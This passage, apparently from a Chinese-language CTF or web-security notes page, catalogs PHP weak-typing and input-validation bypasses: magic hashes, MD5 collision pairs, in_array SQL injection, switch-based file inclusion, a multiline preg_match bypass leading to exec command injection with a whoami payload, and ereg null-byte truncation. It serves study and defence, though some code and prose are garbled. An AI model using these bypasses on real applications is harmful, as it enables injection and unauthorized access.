<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// %0c1%00</span></span><br><span class="line">    <span class="variable">$number</span> = <span class="string">&quot;\f1\0&quot;</span>;</span><br><span class="line">    <span class="comment">// trim 函数会过滤 \n\r\t\v\0，但不会过滤过滤\f</span></span><br><span class="line">    <span class="variable">$number_2</span> = trim(<span class="variable">$number</span>);</span><br><span class="line">    var_dump(<span class="variable">$number_2</span>); <span class="comment">// \f1</span></span><br><span class="line">    <span class="variable">$number_2</span> = addslashes(<span class="variable">$number_2</span>);</span><br><span class="line">    var_dump(<span class="variable">$number_2</span>);  <span class="comment">// \f1</span></span><br><span class="line">    <span class="comment">// is_numeric 检测的时候会过滤掉 &#x27;&#x27;, &#x27;\t&#x27;, &#x27;\n&#x27;, &#x27;\r&#x27;, &#x27;\v&#x27;, &#x27;\f&#x27; 等字符</span></span><br><span class="line">    <span class="comment">// 但是不会过滤 &#x27;\0&#x27;</span></span><br><span class="line">    var_dump(is_numeric(<span class="variable">$number</span>)); <span class="comment">// false</span></span><br><span class="line">    var_dump(strval(intval(<span class="variable">$number_2</span>))); <span class="comment">// 1</span></span><br><span class="line">    var_dump(<span class="string">&quot;\f1&quot;</span> == <span class="string">&quot;1&quot;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h2><p>PHP提供了is_numeric函数，用来变量判断是否为数字。但是函数的范围比较广泛，不仅仅是十进制的数字。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="number">233333</span>);       <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="string">&#x27;233333&#x27;</span>);    <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="number">0x233333</span>);    <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="string">&#x27;0x233333&#x27;</span>);    <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="string">&#x27;9e9&#x27;</span>);   <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="string">&#x27;233333abc&#x27;</span>);  <span class="comment">// 0</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>is_numeric 检测的时候会自动过滤掉前面的 ‘ ‘, ‘\t’, ‘\n’, ‘\r’, ‘\v’, ‘\f’ 等字符，但是不会过滤 ‘\0’，如果这些字符出现在字符串尾，也不会过滤，二是返回 false</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(is_numeric(<span class="string">&quot;\01&quot;</span>)); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">var_dump(is_numeric(<span class="string">&quot; 1&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">var_dump(is_numeric(<span class="string">&quot;\t1&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">var_dump(is_numeric(<span class="string">&quot;\n1&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">var_dump(is_numeric(<span class="string">&quot;\r1&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">var_dump(is_numeric(<span class="string">&quot;\v1&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">var_dump(is_numeric(<span class="string">&quot;\f1&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">var_dump(is_numeric(<span class="string">&quot;\f\f1&quot;</span>)); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">var_dump(is_numeric(<span class="string">&quot;1\f&quot;</span>)); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h2 id="数组与字符串"><a href="#数组与字符串" class="headerlink" title="数组与字符串"></a>数组与字符串</h2><p>当 $var 是一个字符串的时候，访问 $var[“any string”] 跟访问 $var[intval(“any string”)] 效果是一样的。如果有变量覆盖，可以实现一些绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$userinfo</span> = <span class="string">&#x27;abcdefg&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$userinfo</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="number">123</span>;</span><br><span class="line"><span class="comment">// 这里等价于 $var[0] = 1，$userinfo[&#x27;id&#x27;] = 1</span></span><br><span class="line"><span class="variable">$userinfo</span>[<span class="string">&#x27;role&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$userinfo</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag&#123;***&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="in-array"><a href="#in-array" class="headerlink" title="in_array"></a>in_array</h2><p>in_array函数用来判断一个值是否在某一个数组列表里面，通常判断方式如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">in_array(<span class="string">&#x27;b&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>这段代码的作用是过滤 GET 参数 typeid 在不在 1，2，3，4 这个数组里面。但是，in_array 函数存在自动类型转换。如果请求，typeid=1’ union select… 也能通过 in_array 的验证</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$_GET</span>(<span class="string">&#x27;typeid&#x27;</span>], <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>))) &#123;</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;select …. where typeid=&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;typeid&#x27;</span>]<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    echo <span class="subst">$sql</span>;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="和"><a href="#和" class="headerlink" title="== 和 ==="></a>== 和 ===</h2><ul>
<li>== 是弱类型的比较</li>
<li>=== 比较符则可以避免这种隐式转换，除了检查值还检查类型。</li>
</ul>
<p>以下比较的结果都为 true</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 0x 开头会被当成16进制54975581388的16进制为 0xccccccccc</span></span><br><span class="line"><span class="comment">// 十六进制与整数，被转换为同一进制比较</span></span><br><span class="line"><span class="string">&#x27;0xccccccccc&#x27;</span> == <span class="string">&#x27;54975581388&#x27;</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">// 字符串在与数字比较前会自动转换为数字，如果不能转换为数字会变成0</span></span><br><span class="line"><span class="number">1</span> == <span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="number">1</span> == <span class="string">&#x27;01&#x27;</span></span><br><span class="line"><span class="number">10</span> == <span class="string">&#x27;1e1&#x27;</span></span><br><span class="line"><span class="number">100</span> == <span class="string">&#x27;1e2&#x27;</span> </span><br><span class="line"><span class="number">0</span> == <span class="string">&#x27;a&#x27;</span> <span class="comment">// a 转换为数字为 0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 十六进制数与带空格十六进制数，被转换为十六进制整数</span></span><br><span class="line"><span class="string">&#x27;0xABCdef&#x27;</span> == <span class="string">&#x27;     0xABCdef&#x27;</span></span><br><span class="line"><span class="string">&#x27;0010e2&#x27;</span> == <span class="string">&#x27;1e3&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="magic-hash"><a href="#magic-hash" class="headerlink" title="magic hash"></a>magic hash</h2><p>md5</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 0e 开头，后面全是数字的</span></span><br><span class="line"><span class="number">240610708</span>: <span class="number">0e462097431906509019562988736854</span></span><br><span class="line">QLTHNDT: <span class="number">0e405967825401955372549139051580</span></span><br><span class="line">QNKCDZO: <span class="number">0e830400451993494058024219903391</span></span><br><span class="line">PJNPDWY: <span class="number">0e291529052894702774557631701704</span></span><br><span class="line">NWWKITQ: <span class="number">0e763082070976038347657360817689</span></span><br><span class="line">NOOPCJF: <span class="number">0e818888003657176127862245791911</span></span><br><span class="line">MMHUWUV: <span class="number">0e701732711630150438129209816536</span></span><br><span class="line">MAUXXQC: <span class="number">0e478478466848439040434801845361</span></span><br><span class="line">IHKFRNS: <span class="number">0e256160682445802696926137988570</span></span><br><span class="line">GZECLQZ: <span class="number">0e537612333747236407713628225676</span></span><br><span class="line">GGHMVOE: <span class="number">0e362766013028313274586933780773</span></span><br><span class="line">GEGHBXL: <span class="number">0e248776895502908863709684713578</span></span><br><span class="line">EEIZDOI: <span class="number">0e782601363539291779881938479162</span></span><br><span class="line">DYAXWCA: <span class="number">0e424759758842488633464374063001</span></span><br><span class="line">DQWRASX: <span class="number">0e742373665639232907775599582643</span></span><br><span class="line">BRTKUJZ: <span class="number">00e57640477961333848717747276704</span></span><br><span class="line">ABJIHVY: <span class="number">0e755264355178451322893275696586</span></span><br><span class="line">aaaXXAYW: <span class="number">0e540853622400160407992788832284</span></span><br><span class="line">aabg7XSs: <span class="number">0e087386482136013740957780965295</span></span><br><span class="line">aabC9RqS: <span class="number">0e041022518165728065344349536299</span></span><br></pre></td></tr></table></figure>
<p>sha1</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">10932435112</span>: <span class="number">0e07766915004133176347055865026311692244</span></span><br><span class="line">aaroZmOk: <span class="number">0e66507019969427134894567494305185566735</span></span><br><span class="line">aaK1STfY: <span class="number">0e76658526655756207688271159624026011393</span></span><br><span class="line">aaO8zKZF: <span class="number">0e89257456677279068558073954252716165668</span></span><br><span class="line">aa3OFF9m: <span class="number">0e36977786278517984959260394024281014729</span></span><br></pre></td></tr></table></figure>
<p>crc32</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">6586</span>: <span class="number">0e817678</span></span><br></pre></td></tr></table></figure>
<p>两个 md5 一样的字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii import unhexlify</span><br><span class="line"><span class="keyword">from</span> hashlib import md5</span><br><span class="line"><span class="keyword">from</span> future.moves.urllib.parse import quote</span><br><span class="line"></span><br><span class="line">input1 = <span class="string">&#x27;Oded Goldreich\nOded Goldreich\nOded Goldreich\nOded Go&#x27;</span> + unhexlify(</span><br><span class="line"><span class="string">&#x27;d8050d0019bb9318924caa96dce35cb835b349e144e98c50c22cf461244a4064bf1afaecc5820d428ad38d6bec89a5ad51e29063dd79b16cf67c12978647f5af123de3acf844085cd025b956&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(quote(input1))</span><br><span class="line"><span class="keyword">print</span> md5(input1).hexdigest()</span><br><span class="line"></span><br><span class="line">input2 = <span class="string">&#x27;Neal Koblitz\nNeal Koblitz\nNeal Koblitz\nNeal Koblitz\n&#x27;</span> + unhexlify(<span class="string">&#x27;75b80e0035f3d2c909af1baddce35cb835b349e144e88c50c22cf461244a40e4bf1afaecc5820d428ad38d6bec89a5ad51e29063dd79b16cf6fc11978647f5af123de3acf84408dcd025b956&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> md5(input2).hexdigest()</span><br><span class="line"><span class="keyword">print</span>(quote(input2))</span><br></pre></td></tr></table></figure>
<p>另外一组 md5 一样的字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> array <span class="keyword">import</span> array</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">input1 = array(<span class="string">&#x27;I&#x27;</span>, [<span class="number">0x6165300e</span>,<span class="number">0x87a79a55</span>,<span class="number">0xf7c60bd0</span>,<span class="number">0x34febd0b</span>,<span class="number">0x6503cf04</span>,<span class="number">0x854f709e</span>,<span class="number">0xfb0fc034</span>,<span class="number">0x874c9c65</span>,<span class="number">0x2f94cc40</span>,<span class="number">0x15a12deb</span>,<span class="number">0x5c15f4a3</span>,<span class="number">0x490786bb</span>,<span class="number">0x6d658673</span>,<span class="number">0xa4341f7d</span>,<span class="number">0x8fd75920</span>,<span class="number">0xefd18d5a</span>])</span><br><span class="line">input2 = array(<span class="string">&#x27;I&#x27;</span>, [x^y <span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(input1, [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&lt;&lt;<span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&lt;&lt;<span class="number">31</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])])</span><br><span class="line">print(input1 == input2) <span class="comment"># False</span></span><br><span class="line">print(md5(input1).hexdigest()) <span class="comment"># cee9a457e790cf20d4bdaa6d69f01e41</span></span><br><span class="line">print(md5(input2).hexdigest()) <span class="comment"># cee9a457e790cf20d4bdaa6d69f01e41</span></span><br></pre></td></tr></table></figure>
<p>magic hash</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">md2 <span class="number">32</span>  <span class="number">505144726</span>   <span class="number">0e015339760548602306096794382326</span>    WhiteHat Security, Inc.</span><br><span class="line">md4 <span class="number">32</span>  <span class="number">48291204</span>    <span class="number">0e266546927425668450445617970135</span>    WhiteHat Security, Inc.</span><br><span class="line">md5 <span class="number">32</span>  <span class="number">240610708</span>   <span class="number">0e462097431906509019562988736854</span>    Michal Spacek</span><br><span class="line">sha1    <span class="number">40</span>  <span class="number">10932435112</span> <span class="number">0e07766915004133176347055865026311692244</span>    Independently found by Michael A. Cleverly &amp; Michele Spagnuolo &amp; Rogdham</span><br><span class="line">sha224  <span class="number">56</span>  –   –   –</span><br><span class="line">sha256  <span class="number">64</span>  –   –   –</span><br><span class="line">sha384  <span class="number">96</span>  –   –   –</span><br><span class="line">sha512  <span class="number">128</span> –   –   –</span><br><span class="line">ripemd128   <span class="number">32</span>  <span class="number">315655854</span>   <span class="number">0e251331818775808475952406672980</span>    WhiteHat Security, Inc.</span><br><span class="line">ripemd160   <span class="number">40</span>  <span class="number">20583002034</span> <span class="number">00e1839085851394356611454660337505469745</span>    Michael A Cleverly</span><br><span class="line">ripemd256   <span class="number">64</span>  –   –   –</span><br><span class="line">ripemd320   <span class="number">80</span>  –   –   –</span><br><span class="line">whirlpool   <span class="number">128</span> –   –   –</span><br><span class="line">tiger128,<span class="number">3</span>  <span class="number">32</span>  <span class="number">265022640</span>   <span class="number">0e908730200858058999593322639865</span>    WhiteHat Security, Inc.</span><br><span class="line">tiger160,<span class="number">3</span>  <span class="number">40</span>  <span class="number">13181623570</span> <span class="number">00e4706040169225543861400227305532507173</span>    Michele Spagnuolo</span><br><span class="line">tiger192,<span class="number">3</span>  <span class="number">48</span>  –   –   –</span><br><span class="line">tiger128,<span class="number">4</span>  <span class="number">32</span>  <span class="number">479763000</span>   <span class="number">00e05651056780370631793326323796</span>    WhiteHat Security, Inc.</span><br><span class="line">tiger160,<span class="number">4</span>  <span class="number">40</span>  <span class="number">62241955574</span> <span class="number">0e69173478833895223726165786906905141502</span>    Michele Spagnuolo</span><br><span class="line">tiger192,<span class="number">4</span>  <span class="number">48</span>  –   –   –</span><br><span class="line">snefru  <span class="number">64</span>  –   –   –</span><br><span class="line">snefru256   <span class="number">64</span>  –   –   –</span><br><span class="line">gost    <span class="number">64</span>  –   –   –</span><br><span class="line">adler32 <span class="number">8</span>   FR  <span class="number">00e00099</span>    WhiteHat Security, Inc.</span><br><span class="line">crc32   <span class="number">8</span>   <span class="number">2332</span>    <span class="number">0e684322</span>    WhiteHat Security, Inc.</span><br><span class="line">crc32b  <span class="number">8</span>   <span class="number">6586</span>    <span class="number">0e817678</span>    WhiteHat Security, Inc.</span><br><span class="line">fnv132  <span class="number">8</span>   <span class="number">2186</span>    <span class="number">0e591528</span>    WhiteHat Security, Inc.</span><br><span class="line">fnv164  <span class="number">16</span>  <span class="number">8338000</span> <span class="number">0e73845709713699</span>    WhiteHat Security, Inc.</span><br><span class="line">joaat   <span class="number">8</span>   <span class="number">8409</span>    <span class="number">0e074025</span>    WhiteHat Security, Inc.</span><br><span class="line">haval128,<span class="number">3</span>  <span class="number">32</span>  <span class="number">809793630</span>   <span class="number">00e38549671092424173928143648452</span>    WhiteHat Security, Inc.</span><br><span class="line">haval160,<span class="number">3</span>  <span class="number">40</span>  <span class="number">18159983163</span> <span class="number">0e01697014920826425936632356870426876167</span>    Independently found by Michael Cleverly &amp; Michele Spagnuolo</span><br><span class="line">haval192,<span class="number">3</span>  <span class="number">48</span>  <span class="number">48892056947</span> <span class="number">0e4868841162506296635201967091461310754872302741</span>    Michael A. Cleverly</span><br><span class="line">haval224,<span class="number">3</span>  <span class="number">56</span>  –   –   –</span><br><span class="line">haval256,<span class="number">3</span>  <span class="number">64</span>  –   –   –</span><br><span class="line">haval128,<span class="number">4</span>  <span class="number">32</span>  <span class="number">71437579</span>    <span class="number">0e316321729023182394301371028665</span>    WhiteHat Security, Inc.</span><br><span class="line">haval160,<span class="number">4</span>  <span class="number">40</span>  <span class="number">12368878794</span> <span class="number">0e34042599806027333661050958199580964722</span>    Michele Spagnuolo</span><br><span class="line">haval192,<span class="number">4</span>  <span class="number">48</span>  –   –   –</span><br><span class="line">haval224,<span class="number">4</span>  <span class="number">56</span>  –   –   –</span><br><span class="line">haval256,<span class="number">4</span>  <span class="number">64</span>  –   –   –</span><br><span class="line">haval128,<span class="number">5</span>  <span class="number">32</span>  <span class="number">115528287</span>   <span class="number">0e495317064156922585933029613272</span>    WhiteHat Security, Inc.</span><br><span class="line">haval160,<span class="number">5</span>  <span class="number">40</span>  <span class="number">33902688231</span> <span class="number">00e2521569708250889666329543741175098562</span>    Michele Spagnuolo</span><br><span class="line">haval192,<span class="number">5</span>  <span class="number">48</span>  <span class="number">52888640556</span> <span class="number">0e9108479697641294204710754930487725109982883677</span>    Michele Spagnuolo</span><br><span class="line">haval224,<span class="number">5</span>  <span class="number">56</span>  –   –   –</span><br><span class="line">haval256,<span class="number">5</span>  <span class="number">64</span>  –   –   –</span><br></pre></td></tr></table></figure>
<h2 id="hash-比较的问题"><a href="#hash-比较的问题" class="headerlink" title="hash 比较的问题"></a>hash 比较的问题</h2><p>0e 开头且后面都是数字会被当作科学计数法，也就是等于 0*10^xxx=0。如果 md5 是以 0e 开头，在做比较的时候，可以用这种方法绕过。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">// <span class="string">&#x27;0e5093234&#x27;</span> 为 <span class="number">0</span>，<span class="string">&#x27;0eabc3234&#x27;</span> 不为 <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">// true</span><br><span class="line"><span class="string">&#x27;0e509367213418206700842008763514&#x27;</span> == <span class="string">&#x27;0e481036490867661113260034900752&#x27;</span></span><br><span class="line">// true</span><br><span class="line"><span class="string">&#x27;0e481036490867661113260034900752&#x27;</span> == <span class="string">&#x27;0&#x27;</span> </span><br><span class="line"> </span><br><span class="line">// false</span><br><span class="line">var_dump(<span class="string">&#x27;0&#x27;</span> == <span class="string">&#x27;0e1abcd&#x27;</span>);</span><br><span class="line">// true</span><br><span class="line">var_dump(<span class="number">0</span> == <span class="string">&#x27;0e1abcd&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">var_dump(md5(<span class="string">&#x27;240610708&#x27;</span>) == md5(<span class="string">&#x27;QNKCDZO&#x27;</span>));</span><br><span class="line">var_dump(md5(<span class="string">&#x27;aabg7XSs&#x27;</span>) == md5(<span class="string">&#x27;aabC9RqS&#x27;</span>));</span><br><span class="line">var_dump(sha1(<span class="string">&#x27;aaroZmOk&#x27;</span>) == sha1(<span class="string">&#x27;aaK1STfY&#x27;</span>));</span><br><span class="line">var_dump(sha1(<span class="string">&#x27;aaO8zKZF&#x27;</span>) == sha1(<span class="string">&#x27;aa3OFF9m&#x27;</span>));</span><br></pre></td></tr></table></figure>
<p>如果要找出 0e 开头的 hash 碰撞，可以用如下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$salt</span> = <span class="string">&#x27;vunp&#x27;</span>;</span><br><span class="line"><span class="variable">$hash</span> = <span class="string">&#x27;0e612198634316944013585621061115&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span>&lt;<span class="number">100000000000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (md5(<span class="variable">$salt</span> . <span class="variable">$i</span>) == <span class="variable">$hash</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;  done&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h1 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h1><p>如果 switch 是数字类型的 case 的判断时， switch 会将其中的参数转换为 int类型。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$i</span> =<span class="string">&quot;2abc&quot;</span>;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$i</span>)  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i is less than 3 but not negative&quot;</span>;</span><br><span class="line">        <span class="comment">// 如果$i = 2/../flag_is_here，则通过这种方式可以包含 flag_is_here.php 文件</span></span><br><span class="line">        <span class="keyword">require_once</span> <span class="variable">$i</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i is 3&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个时候程序输出的是 i is less than 3 but not negative，是由于 switch() 函数将 $i 进行了类型转换，转换结果为 2。</p>
<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h2><p>preg_match 函数用于进行正则表达式匹配，返回 pattern 的匹配次数，它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后将会停止搜索。如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;1.1.1.1 abcd&#x27;</span>; <span class="comment">// 可以绕过</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/(\d+)\.(\d+)\.(\d+)\.(\d+)/&quot;</span>,<span class="variable">$ip</span>)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// echo(&#x27;key...&#x27;)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>pre_match 在匹配的时候会消耗较大的资源，并且默认存在贪婪匹配，如果传入一个超长的字符串，会导致 pre_match 消耗大量资源从而导致 php 超时，后面的 php 语句就不会执行。payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$code</span>=<span class="string">&quot;xdsec###AAAAAAAAAAAAAAAAAAA(超多个A)&quot;</span>;</span><br><span class="line">preg_match(<span class="string">&quot;/(\d+)\.(\d+)\.(\d+)\.(\d+)/&quot;</span>, <span class="variable">$code</span>));</span><br></pre></td></tr></table></figure>
<p>就是匹配文件名由字母、数字、下划线、破则号、斜杠、空白字符各种组合的并且后缀名是rpt的文件，如果匹配成功，就执行系统命令file打印文件的类型和编码信息，如果匹配失败就打印’regex failed’.</p>
<p>[<a href="http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt">http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt</a> whoami](<a href="http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt">http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt</a> whoami)</p>
<p>如果开启了/m，会存在绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file_name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&quot;/^[a-zA-Z0-9-s_]+.rpt$/m&quot;</span>, <span class="variable">$file_name</span>)) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;regex failed&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> exec(<span class="string">&quot;/usr/bin/file -i -b &quot;</span>.<span class="variable">$file_name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意到正则表达式结尾的/m 了，在php中，/m表示开启多行匹配模式，开启多行匹配模式之后^和的 含 义 就 发 生 了 变 化 ， 没 开 启 多 行 模 式 之 前 ( 即 单 行 匹 配 模 式 ) , 和 的含义就发生了变化，没开启多行模式之前(即单行匹配模式), ^ 和的含义就发生了变化，没开启多行模式之前(即单行匹配模式),和 是匹配字符串的开始和结尾，开启多行模式之后，多行模式^,$可以匹配每行的开头和结尾，所以上述payload里面含有换行符，被当做两行处理，一行匹配OK即可，所以进入了exec执行分支，进而导致命令执行。</p>
<p>[<a href="http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt">http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt</a> whoami](<a href="http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt">http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt</a> whoami)</p>
<p>开启/m</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">^ 行首</span><br><span class="line"><span class="variable">$</span> 行尾</span><br></pre></td></tr></table></figure>
<p>不开启/m</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">^ 字符串的开始</span><br><span class="line"><span class="variable">$</span> 字符串的结尾</span><br></pre></td></tr></table></figure>
<p>修饰符说明</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">i 在和正则匹配是不区分大小写 </span><br><span class="line">m 将字符串视为多行。默认的正则开始“^”和结束“<span class="variable">$</span>”将目标字条串作为一单一的一“行”字符（甚至其中包括换行符也是如此）。如果在修饰符中加上“m”，那么开始和结束将会指点字符串的每一行的开头就是“^”结束就是“<span class="variable">$</span>”。 </span><br><span class="line">o 评估表达式只有一次</span><br><span class="line">s 如果设定了这个修正符，那么，被匹配的字符串将视为一行来看，包括换行符，换行符将被视为普通字符串。 </span><br><span class="line">x 忽略空白，除非进行转义的不被忽略。 </span><br><span class="line">g 在全局范围内找到所有匹配</span><br><span class="line">cg 即使全局匹配失败也允许搜索继续</span><br></pre></td></tr></table></figure>
<h2 id="preg-match-all"><a href="#preg-match-all" class="headerlink" title="preg_match_all"></a>preg_match_all</h2><p>正则表达式全局匹配，成功返回整个模式匹配的次数（可能为零），如果出错返回 FALSE</p>
<h2 id="ereg-00-截断"><a href="#ereg-00-截断" class="headerlink" title="ereg %00 截断"></a>ereg %00 截断</h2><p>ereg 读到 %00 的时候，就截止了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="literal">FALSE</span>)  &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You password must be alphabet&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里 a=abcd%001234，可以绕过</p>
<h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><h2 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h2><p>extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。</p>
